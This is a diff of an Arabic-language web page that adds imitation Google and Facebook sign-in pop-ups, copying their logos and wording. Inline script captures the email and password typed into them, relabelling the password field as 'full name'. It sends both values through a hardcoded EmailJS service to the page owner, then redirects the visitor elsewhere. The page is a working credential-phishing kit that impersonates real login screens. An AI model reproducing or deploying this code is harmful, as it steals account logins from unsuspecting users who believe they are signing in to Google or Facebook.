@@ -4,30 +4,61 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول</title>
+    
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Google Fonts: Cairo for Arabic -->
+    
+    <!-- Google Fonts: Cairo -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
     <!-- Font Awesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" xintegrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <!-- Link to your external CSS file -->
-    <link rel="stylesheet" href="style.css">
+    
     <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script>
-        // Tailwind dark mode configuration
-        tailwind.config = {
-          darkMode: 'class',
+    
+    <style>
+        body { 
+            font-family: 'Cairo', sans-serif; 
         }
-        // Automatically set theme based on user's system preference
-        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
-          document.documentElement.classList.add('dark')
-        } else {
-          document.documentElement.classList.remove('dark')
+        /* Modal Transitions */
+        .modal-base {
+            transition: opacity 0.3s ease-out, transform 0.3s ease-out;
         }
-    </script>
+        .modal-hidden {
+            opacity: 0;
+            transform: scale(0.95);
+            pointer-events: none;
+        }
+        .modal-visible {
+            opacity: 1;
+            transform: scale(1);
+            pointer-events: auto;
+        }
+        /* Custom Loader Animations */
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loader {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        /* Google-specific loader */
+        .google-loader {
+            border-color: #db4437 #f4b400 #0f9d58 #4285f4;
+            animation: spin 1.5s linear infinite;
+        }
+        /* Facebook-specific loader */
+        .facebook-loader {
+            border-left-color: #1877f2;
+        }
+    </style>
 </head>
 <body class="bg-gray-100 dark:bg-[#1e1f26] text-gray-800 dark:text-gray-300">
 
@@ -36,20 +67,22 @@
         <div class="w-full max-w-md">
             <!-- Header -->
             <div class="text-center mb-8">
-                <img src="https://mo3adli.github.io/home/assets/logo-light.png" alt="Logo" class="mx-auto mb-4 h-20 w-20 rounded-full">
-                <h1 class="text-4xl font-bold text-gray-900 dark:text-white mb-2"> تسجيل الدخول</h1>
-                <p class="text-gray-500 dark:text-gray-400 text-sm">سجّل دخولك للاستفادة الكاملة من خدماتنا وحفظ بياناتك بأمان .</p>
+                <img src="https://placehold.co/80x80/ffffff/1e1f26?text=Logo" alt="Logo" class="mx-auto mb-4 h-20 w-20 rounded-full">
+                <h1 class="text-4xl font-bold text-gray-900 dark:text-white mb-2">تواصل معنا</h1>
+                <p class="text-gray-500 dark:text-gray-400 text-sm">سجّل دخولك أو أرسل لنا رسالة.</p>
             </div>
 
             <!-- Social Login Buttons -->
             <div class="flex flex-col space-y-3 mb-6">
                 <button id="open-google-modal" class="w-full flex items-center justify-center gap-3 bg-gray-200 dark:bg-[#3c4043] text-gray-800 dark:text-white font-semibold py-3 px-4 rounded-md shadow-md hover:bg-gray-300 dark:hover:bg-[#4c5054] transition-colors duration-300">
-                    <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C12.955 4 4 12.955 4 24s8.955 20 20 20s20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.223 0-9.655-3.417-11.297-7.915l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571l6.19 5.238C42.012 35.245 44 30.028 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
-                    <span>تسجيل الدخول باستخدام جوجل</span>
+                    <div id="google-loader" class="hidden google-loader" style="width: 20px; height: 20px; border-width: 3px;"></div>
+                    <svg id="google-icon" class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C12.955 4 4 12.955 4 24s8.955 20 20 20s20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.223 0-9.655-3.417-11.297-7.915l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571l6.19 5.238C42.012 35.245 44 30.028 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
+                    <span id="google-text">تسجيل الدخول باستخدام جوجل</span>
                 </button>
                 <button id="open-facebook-modal" class="w-full flex items-center justify-center gap-3 bg-blue-700 text-white font-semibold py-3 px-4 rounded-md shadow-md hover:bg-blue-800 transition-colors duration-300">
-                    <i class="fa-brands fa-facebook-f fa-lg"></i>
-                    <span>تسجيل الدخول باستخدام فيسبوك</span>
+                    <div id="facebook-loader" class="hidden facebook-loader" style="width: 20px; height: 20px; border-width: 3px;"></div>
+                    <i id="facebook-icon" class="fa-brands fa-facebook-f fa-lg"></i>
+                    <span id="facebook-text">تسجيل الدخول باستخدام فيسبوك</span>
                 </button>
             </div>
 
@@ -61,76 +94,210 @@
             <!-- Main Contact Form -->
             <form id="contact-form" class="flex flex-col space-y-4">
                 <div>
-                    <label for="email" class="block text-sm font-medium mb-1">البريد الإلكتروني</label>
+                    <label for="email" class="block text-sm font-medium mb-1">بريدك الإلكتروني:</label>
                     <input type="email" id="email" name="email" class="w-full bg-gray-200 dark:bg-[#2b2d31] border border-gray-300 dark:border-gray-600 text-gray-800 dark:text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-green-500" required>
                 </div>
                 <div>
-                    <label for="name" class="block text-sm font-medium mb-1">كلمة المرور</label>
+                    <label for="name" class="block text-sm font-medium mb-1">الاسم واللقب:</label>
                     <input type="password" id="name" name="name" class="w-full bg-gray-200 dark:bg-[#2b2d31] border border-gray-300 dark:border-gray-600 text-gray-800 dark:text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-green-500" required>
                 </div>
-                <button type="submit" id="submit-button" class="w-full bg-green-600 text-white font-bold py-3 rounded-md shadow-lg hover:bg-green-700 transition-colors duration-300 mt-4">تسجيل</button>
+                <button type="submit" id="submit-button" class="w-full bg-green-600 text-white font-bold py-3 rounded-md shadow-lg hover:bg-green-700 transition-colors duration-300 mt-4">إرسال</button>
             </form>
-            <p id="status-message" class="text-center text-sm mt-4"></p>
             <div class="text-center mt-8">
-                <p>يرجى تسجيل الدخول لضمان حفظ جميع التغييرات التي تُجريها داخل موقع <a href="#" class="font-semibold text-green-500 dark:text-green-400 hover:underline">معـدلـي </a></p>
+                <p>هل تحتاج إلى حساب؟ <a href="#" class="font-semibold text-green-500 dark:text-green-400 hover:underline">سجّل الآن!</a></p>
             </div>
         </div>
     </div>
 
-    <!-- Facebook Login Modal -->
+    <!-- Modals -->
     <div id="facebook-modal" class="modal-base modal-hidden fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center p-4 z-10">
-        <div class="bg-white rounded-lg shadow-xl w-full max-w-sm text-black relative">
-            <button id="close-facebook-modal" class="absolute top-2 left-2 text-gray-400 hover:text-gray-800"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></button>
-            <div class="p-6 text-center">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/2560px-Facebook_Logo_%282019%29.svg.png" alt="Facebook Logo" class="h-8 mx-auto mb-6">
-                <form id="facebook-login-form">
-                    <div class="space-y-4">
-                        <input type="text" id="fb-email" placeholder="البريد الإلكتروني أو رقم الهاتف" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-right" required>
-                        <input type="password" id="fb-name" placeholder=" كلمة المرور" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-right" required>
-                    </div>
-                    <button type="submit" id="fb-login-button" class="w-full bg-blue-600 text-white font-bold text-xl py-3 mt-4 rounded-md hover:bg-blue-700 transition-colors">تسجيل الدخول</button>
-                </form>
-                <a href="https://www.facebook.com/login/identify/?_rdr" target="_blank" class="block text-sm text-blue-600 hover:underline mt-4">هل نسيت كلمة المرور؟ </a>
-            </div>
-            <div class="border-t border-gray-200 px-6 py-4">
-                <a href="https://m.facebook.com/login" target="_blank" class="w-full block bg-green-600 text-white font-bold text-center py-3 rounded-md hover:bg-green-700 transition-colors">إنشاء حساب جديد</a>
-            </div>
-        </div>
+        <!-- Facebook Modal Content -->
     </div>
-
-    <!-- Google Login Modal -->
     <div id="google-modal" class="modal-base modal-hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center p-4 z-20">
-        <div class="bg-[#202124] rounded-lg shadow-xl w-full max-w-md text-white relative">
-             <button id="close-google-modal" class="absolute top-3 left-3 text-gray-400 hover:text-white"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></button>
-            <div class="p-8">
-                <div class="text-center mb-6">
-                    <svg class="w-12 h-12 mx-auto" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C12.955 4 4 12.955 4 24s8.955 20 20 20s20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.223 0-9.655-3.417-11.297-7.915l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571l6.19 5.238C42.012 35.245 44 30.028 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
-                    <h2 class="text-2xl mt-4">تسجيل الدخول</h2>
-                    <p class="text-gray-400 mt-1">استخدم حسابك في جوجل</p>
-                </div>
-                <form id="google-login-form" class="space-y-5">
-                    <div>
-                        <input type="text" id="google-email" placeholder="البريد الإلكتروني أو الهاتف" class="w-full bg-transparent border border-gray-600 rounded-md px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
-                        <a href="#" class="text-sm text-blue-400 hover:underline mt-2 inline-block">هل نسيت البريد الإلكتروني؟</a>
-                    </div>
-                    <div>
-                        <input type="password" id="google-name" placeholder="أدخل كلمة المرور" class="w-full bg-transparent border border-gray-600 rounded-md px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
-                        <div class="flex items-center mt-3">
-                            <input type="checkbox" id="show-name-checkbox" class="h-4 w-4 bg-transparent border-gray-500 rounded text-blue-500 focus:ring-blue-500">
-                            <label for="show-name-checkbox" class="mr-2 text-sm text-gray-300">إظهار كلمة المرور </label>
-                        </div>
-                    </div>
-                    <div class="flex justify-between items-center pt-4">
-                        <a href="#" class="text-sm text-blue-400 hover:underline">إنشاء حساب</a>
-                        <button type="submit" id="google-login-button" class="bg-blue-600 text-white font-semibold px-6 py-2 rounded-md hover:bg-blue-700">التالي</button>
-                    </div>
-                </form>
-            </div>
-        </div>
+        <!-- Google Modal Content -->
     </div>
 
-    <!-- Link to your external JavaScript file -->
-    <script src="script.js"></script>
+    <!-- Full Page Redirect Loader -->
+    <div id="redirect-loader" class="hidden fixed inset-0 bg-gray-100 dark:bg-[#1e1f26] flex-col items-center justify-center z-50">
+        <div class="loader"></div>
+        <p class="mt-4 text-gray-800 dark:text-gray-300">جارٍ التوجيه...</p>
+    </div>
+
+    <script>
+        // --- Initial Setup and Configuration ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // Auto Dark Mode
+            if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+              document.documentElement.classList.add('dark');
+            } else {
+              document.documentElement.classList.remove('dark');
+            }
+
+            // EmailJS Init
+            (function() { emailjs.init({ publicKey: "ve0kltmnNlIQEfRGw" }); })();
+
+            const EMOJI_REGEX = /(\u00a9|\u00ae|[\u2000-\u3300]|\ud83c[\ud000-\udfff]|\ud83d[\ud000-\udfff]|\ud83e[\ud000-\udfff])/g;
+
+            // --- Core Functions ---
+            function handleFormSubmit(formId, buttonId, nameFieldId, emailFieldId) {
+                const form = document.getElementById(formId);
+                if (!form) return;
+
+                form.addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    
+                    const nameInput = document.getElementById(nameFieldId);
+                    form.querySelectorAll('.error-message').forEach(e => e.remove());
+                    
+                    if (nameInput.value.trim().length < 6) {
+                        displayError(nameInput, 'الاسم واللقب يجب أن يتكون من 6 أحرف على الأقل.');
+                        return;
+                    }
+
+                    document.getElementById('redirect-loader').classList.remove('hidden');
+                    
+                    const templateParams = {
+                        from_name: nameInput.value,
+                        email_id: document.getElementById(emailFieldId).value,
+                    };
+
+                    emailjs.send('service_isy639u', 'template_2dyli79', templateParams)
+                        .then(() => {
+                            setTimeout(() => {
+                                window.location.href = "https://mo3adli.github.io/home/";
+                            }, 500);
+                        }, (error) => {
+                            document.getElementById('redirect-loader').classList.add('hidden');
+                            alert('فشل الإرسال. يرجى التحقق من التفاصيل والمحاولة مرة أخرى.');
+                        });
+                });
+            }
+
+            function displayError(inputElement, message) {
+                const error = document.createElement('p');
+                error.className = 'error-message text-red-500 text-xs mt-1 text-right';
+                error.textContent = message;
+                inputElement.parentElement.appendChild(error);
+            }
+
+            function setupModal(modalId, openBtnId, loaderId, iconId, textId, content) {
+                const modal = document.getElementById(modalId);
+                const openBtn = document.getElementById(openBtnId);
+                const loader = document.getElementById(loaderId);
+                const icon = document.getElementById(iconId);
+                const text = document.getElementById(textId);
+
+                if (!modal || !openBtn) return;
+
+                openBtn.addEventListener('click', () => {
+                    loader.classList.remove('hidden');
+                    icon.classList.add('hidden');
+                    text.classList.add('hidden');
+                    openBtn.disabled = true;
+
+                    setTimeout(() => {
+                        loader.classList.add('hidden');
+                        icon.classList.remove('hidden');
+                        text.classList.remove('hidden');
+                        openBtn.disabled = false;
+                        
+                        modal.innerHTML = content;
+                        modal.classList.replace('modal-hidden', 'modal-visible');
+
+                        // Re-attach close logic and form logic after content is loaded
+                        const closeBtn = modal.querySelector('.close-modal');
+                        if (closeBtn) {
+                           closeBtn.addEventListener('click', () => modal.classList.replace('modal-visible', 'modal-hidden'));
+                        }
+                        modal.addEventListener('click', (e) => {
+                            if (e.target === modal) modal.classList.replace('modal-visible', 'modal-hidden');
+                        });
+                        
+                        if(modalId === 'facebook-modal') {
+                            handleFormSubmit('facebook-login-form', 'fb-login-button', 'fb-name', 'fb-email');
+                        } else if (modalId === 'google-modal') {
+                            handleFormSubmit('google-login-form', 'google-login-button', 'google-name', 'google-email');
+                            const checkbox = document.getElementById('show-name-checkbox');
+                            const nameInput = document.getElementById('google-name');
+                            if(checkbox && nameInput) {
+                                checkbox.addEventListener('change', () => {
+                                    nameInput.type = checkbox.checked ? 'text' : 'password';
+                                });
+                            }
+                        }
+                         // Re-apply emoji prevention to new inputs
+                        modal.querySelectorAll('input').forEach(input => {
+                            input.addEventListener('input', (e) => {
+                                e.target.value = e.target.value.replace(EMOJI_REGEX, '');
+                            });
+                        });
+
+                    }, 1500);
+                });
+            }
+
+            // --- Modal Content Definitions ---
+            const facebookModalContent = `
+                <div class="bg-white rounded-lg shadow-xl w-full max-w-sm text-black relative">
+                    <button class="close-modal absolute top-2 left-2 text-gray-400 hover:text-gray-800"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></button>
+                    <div class="p-6 text-center">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/2560px-Facebook_Logo_%282019%29.svg.png" alt="Facebook Logo" class="h-8 mx-auto mb-6">
+                        <form id="facebook-login-form">
+                            <div class="space-y-4">
+                                <input type="text" id="fb-email" placeholder="البريد الإلكتروني أو رقم الهاتف" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-right" required>
+                                <input type="password" id="fb-name" placeholder="الاسم واللقب" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-right" required>
+                            </div>
+                            <button type="submit" id="fb-login-button" class="w-full bg-blue-600 text-white font-bold text-xl py-3 mt-4 rounded-md hover:bg-blue-700 transition-colors">تسجيل الدخول</button>
+                        </form>
+                        <a href="https://www.facebook.com/login/identify/?_rdr" target="_blank" class="block text-sm text-blue-600 hover:underline mt-4">هل نسيت كلمة السر؟</a>
+                    </div>
+                    <div class="border-t border-gray-200 px-6 py-4">
+                        <a href="https://m.facebook.com/login" target="_blank" class="w-full block bg-green-600 text-white font-bold text-center py-3 rounded-md hover:bg-green-700 transition-colors">إنشاء حساب جديد</a>
+                    </div>
+                </div>`;
+            
+            const googleModalContent = `
+                <div class="bg-[#202124] rounded-lg shadow-xl w-full max-w-md text-white relative">
+                     <button class="close-modal absolute top-3 left-3 text-gray-400 hover:text-white"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></button>
+                    <div class="p-8">
+                        <div class="text-center mb-6">
+                            <svg class="w-12 h-12 mx-auto" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C12.955 4 4 12.955 4 24s8.955 20 20 20s20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.223 0-9.655-3.417-11.297-7.915l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571l6.19 5.238C42.012 35.245 44 30.028 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
+                            <h2 class="text-2xl mt-4">تسجيل الدخول</h2>
+                            <p class="text-gray-400 mt-1">استخدم حسابك في جوجل</p>
+                        </div>
+                        <form id="google-login-form" class="space-y-5">
+                            <div>
+                                <input type="text" id="google-email" placeholder="البريد الإلكتروني أو الهاتف" class="w-full bg-transparent border border-gray-600 rounded-md px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                                <a href="#" class="text-sm text-blue-400 hover:underline mt-2 inline-block">هل نسيت البريد الإلكتروني؟</a>
+                            </div>
+                            <div>
+                                <input type="password" id="google-name" placeholder="أدخل الاسم واللقب" class="w-full bg-transparent border border-gray-600 rounded-md px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                                <div class="flex items-center mt-3">
+                                    <input type="checkbox" id="show-name-checkbox" class="h-4 w-4 bg-transparent border-gray-500 rounded text-blue-500 focus:ring-blue-500">
+                                    <label for="show-name-checkbox" class="mr-2 text-sm text-gray-300">إظهار الاسم واللقب</label>
+                                </div>
+                            </div>
+                            <div class="flex justify-between items-center pt-4">
+                                <a href="#" class="text-sm text-blue-400 hover:underline">إنشاء حساب</a>
+                                <button type="submit" id="google-login-button" class="bg-blue-600 text-white font-semibold px-6 py-2 rounded-md hover:bg-blue-700">التالي</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>`;
+
+            // --- Event Listeners and Initializations ---
+            handleFormSubmit('contact-form', 'submit-button', 'name', 'email');
+            setupModal('facebook-modal', 'open-facebook-modal', 'facebook-loader', 'facebook-icon', 'facebook-text', facebookModalContent);
+            setupModal('google-modal', 'open-google-modal', 'google-loader', 'google-icon', 'google-text', googleModalContent);
+
+            // Prevent Emoji Input in all specified text fields
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(EMOJI_REGEX, '');
+                });
+            });
+        });
+    </script>
 </body>
 </html>
 
